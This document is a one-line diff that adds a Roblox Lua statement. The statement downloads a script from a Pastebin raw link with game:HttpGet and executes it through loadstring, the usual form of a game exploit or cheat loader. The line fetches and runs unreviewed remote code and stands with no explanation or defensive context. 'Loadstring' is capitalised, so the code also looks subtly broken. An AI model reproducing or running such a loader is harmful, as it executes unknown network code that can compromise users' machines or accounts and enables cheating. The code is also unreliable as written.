@@ -1,0 +1,1 @@
+Loadstring(game:HttpGet("https://pastebin.com/raw/9w9Gd3f2"))()
